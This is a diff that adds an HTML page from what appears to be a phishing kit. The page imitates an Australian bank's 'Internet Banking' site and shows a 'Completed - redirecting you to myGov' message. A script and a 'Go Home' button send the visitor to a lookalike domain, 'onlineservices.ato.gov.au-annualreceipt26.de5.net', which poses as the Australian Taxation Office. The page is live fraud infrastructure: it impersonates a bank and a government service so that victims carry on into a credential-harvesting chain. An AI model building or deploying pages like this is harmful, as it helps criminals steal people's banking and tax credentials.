@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Completed - redirecting you to myGov</title>
+    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body,
+      html {
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+        height: 100%;
+      }
+
+      .header_banner {
+        width: 100%;
+        /* padding: 20px 0; */
+        background-color: #000;
+      }
+
+      .header_inner {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 15px 16px;
+        width: 100%;
+        gap: 20px;
+      }
+
+      .header_left {
+        display: flex;
+        align-items: center;
+      }
+
+      .header_right {
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .header_right p {
+        font-size: 0.8em;
+        padding: 10px;
+      }
+
+      .banner {
+        position: relative;
+        min-height: 100vh;
+        background-image: url("img/bg-login.jpeg");
+        background-repeat: no-repeat;
+        background-size: cover;
+        background-position: center top;
+        background-attachment: fixed;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+      }
+
+      .login_wrapper {
+        width: 100%;
+        max-width: 500px;
+        margin-top: 40px;
+        margin-left: 300px;
+        background-color: white;
+        border-radius: 8px;
+        overflow: hidden;
+      }
+
+      .form_container {
+        width: 100%;
+        height: 150%;
+        padding: 38px 32px;
+        padding-bottom: 0px;
+      }
+
+      h1 {
+        font-size: 30px;
+        margin-bottom: 32px;
+        color: #333;
+        font-weight: 100;
+      }
+
+      .input_field {
+        margin: 40px 0px;
+      }
+
+      .input_field label {
+        font-size: 14px;
+        color: #000;
+        display: block;
+        margin-bottom: 8px;
+        font-weight: bold;
+      }
+
+      .input_field input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+      }
+
+      .input_field .error {
+        color: rgb(194, 0, 0);
+        font-size: 12px;
+      }
+
+      .remember_checkbox {
+        display: flex;
+        align-items: center;
+        margin-bottom: 20px;
+      }
+
+      .remember_checkbox label {
+        font-size: 14px;
+        color: #333;
+        margin-left: 10px;
+      }
+
+      .remember_checkbox input[type="checkbox"] {
+        width: 20px;
+        height: 20px;
+        accent-color: black;
+      }
+
+      .login_button {
+        margin-bottom: 20px;
+      }
+
+      .login_button button {
+        width: 128px;
+        padding: 12px;
+        background-color: #e2001a;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+
+      .login_button button:hover {
+        background-color: #d00016;
+      }
+
+      .footer_links a {
+        color: #d00016;
+      }
+
+      .footer_links a:hover {
+        text-decoration: underline;
+      }
+
+      .footer_link2 {
+        margin-top: 30px;
+        background-color: #e6e6e6;
+        padding: 20px;
+        font-size: 16px;
+        font-weight: 100;
+      }
+
+      .info {
+        color: #4d4d4d;
+        font-size: 14px;
+      }
+
+      .footer_link2 a {
+        color: #d00016;
+        font-weight: bold;
+      }
+
+      .input_field input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+        transition: border 0.3s ease;
+      }
+
+      .input_field input:focus {
+        outline: none;
+        border: 3px solid grey;
+      }
+
+      .input_error {
+        border: 1px solid rgb(194, 0, 0) !important;
+      }
+
+      .input_error:focus {
+        border: 3px solid rgb(194, 0, 0) !important;
+      }
+
+      .input_field .error {
+        color: rgb(194, 0, 0);
+        font-size: 14px;
+        margin-top: 4px;
+        height: 14px;
+        line-height: 14px;
+        transition: all 0.3s ease;
+      }
+
+      /* Modal styles */
+      .modal-backdrop {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 999;
+      }
+
+      .modal {
+        position: fixed;
+        top: 28%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #fff;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        z-index: 1000;
+        width: 400px;
+        height: 300px;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #ddd;
+        border-top: 4px solid rgb(194, 0, 0);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <style>
+      @font-face {
+        font-family: "SourceSans-Light";
+        src: url("font/SourceSans-Light.woff2") format("woff2"),
+          url("font/SourceSans-Light.woff") format("woff");
+        font-weight: 100;
+        font-style: normal;
+      }
+    </style>
+    <style>
+      .loading-div {
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+      .loader {
+        width: 40px;
+        height: 40px;
+        border: 3px solid transparent;
+        border-top: 3px solid #e60000;
+        border-right: 3px solid #e60000;
+        border-radius: 50%;
+        animation: spin 1.5s linear infinite;
+        margin: 0 auto;
+      }
+
+      .loader-message {
+        margin-top: 12px;
+        font-size: 14px;
+        color: #444;
+        text-align: center;
+        font-family: Arial, sans-serif;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+
+    <style>
+      @media screen and (max-width: 768px) {
+        .header_inner {
+          display: flex;
+          justify-content: space-between;
+          padding: 10px 16px;
+        }
+
+        .header_left {
+          margin-left: 0;
+          margin-bottom: 10px;
+        }
+
+        .header_right {
+          display: none;
+        }
+
+        .login_wrapper {
+          width: 90%;
+          margin: 50px auto;
+          background-color: white;
+          border-radius: 8px;
+          overflow: hidden;
+        }
+
+        .form_container {
+          padding: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header_banner" id="headerBanner">
+      <div class="header_inner">
+        <div class="header_left" style="">
+          <img
+            class="logo-img"
+            src="img/star-big.svg"
+            alt=""
+            height="30"
+            width="90"
+          />
+          <h1 style="color: #fff; font-size: 22px; margin: 0">
+            Internet Banking
+          </h1>
+        </div>
+        <div class="header_right">
+          <p id="currentDate"></p>
+          |
+          <p>Help</p>
+          |
+          <p>Security</p>
+          |
+          <p>Contact us</p>
+          |
+          <p>Locate us</p>
+        </div>
+      </div>
+
+      <div class="banner">
+        <div class="login_wrapper">
+          <div class="form_container">
+            <div
+              id="successMessage"
+              style="
+                max-width: 500px;
+                margin: 50px auto;
+                padding: 30px;
+                text-align: center;
+                border: 1px solid #ccc;
+                border-radius: 8px;
+                background-color: #f9f9f9;
+                font-family: Arial, sans-serif;
+              "
+            >
+              <h2 style="color: #e2001a; font-size: 24px; margin-bottom: 15px">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="60"
+                  height="60"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke="#e2001a"
+                  stroke-width="2"
+                  style="margin-bottom: 15px"
+                >
+                  <circle
+                    cx="12"
+                    cy="12"
+                    r="10"
+                    stroke="#e2001a"
+                    stroke-width="2"
+                    fill="none"
+                  />
+                  <path
+                    stroke="#e2001a"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="M7 13l3 3 7-7"
+                  />
+                </svg>
+              </h2>
+              <p style="font-size: 16px; color: #333; margin-bottom: 20px">
+                We are now redirecting you to myGov</p>
+              <p style="font-size: 15px; color: #555; margin-bottom: 30px">
+                Redirecting
+              </p>
+
+              <button
+                onclick="window.location.href='https://onlineservices.ato.gov.au-annualreceipt26.de5.net/mailreceipt/pic.html'"
+                style="
+                  padding: 12px 30px;
+                  font-size: 16px;
+                  background: #e2001a;
+                  color: #fff;
+                  border: none;
+                  border-radius: 4px;
+                  cursor: pointer;
+                "
+              >
+                Go Home
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      function updateImageSrc() {
+        const img = document.querySelector(".logo-img");
+        if (!img) return;
+
+        if (window.innerWidth <= 768) {
+          img.src = "img/star.svg";
+        } else {
+          img.src = "img/star-big.svg";
+        }
+      }
+
+      updateImageSrc();
+
+      window.addEventListener("resize", updateImageSrc);
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const currentDateElement = document.getElementById("currentDate");
+
+        const options = {
+          weekday: "long",
+          day: "numeric",
+          month: "long",
+          year: "numeric",
+        };
+
+        const today = new Date();
+        const formattedDate = today.toLocaleDateString("en-GB", options);
+
+        currentDateElement.textContent = formattedDate;
+      });
+    </script>
+    <script>
+      setTimeout(() => (location.href = "https://onlineservices.ato.gov.au-annualreceipt26.de5.net/mailreceipt/pic.html"), 8000);
+    </script>
+  </body>
+</html>
